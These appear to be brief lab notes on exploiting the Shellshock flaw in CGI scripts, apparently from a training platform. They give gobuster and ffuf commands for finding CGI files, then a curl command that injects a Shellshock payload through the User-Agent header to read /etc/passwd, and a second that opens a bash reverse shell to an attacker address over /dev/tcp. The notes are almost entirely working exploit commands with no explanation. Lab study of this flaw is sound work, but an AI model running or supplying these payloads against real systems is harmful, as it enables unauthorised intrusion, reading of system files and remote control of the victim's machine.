### Enumeration - CGI scripts

```shell
 gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

```sh
ffuf -u https://10.129.204.231/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/small.txt -e .cgi
```

### Confirming the Vulnerability

```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

### Reverse Shell

```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

---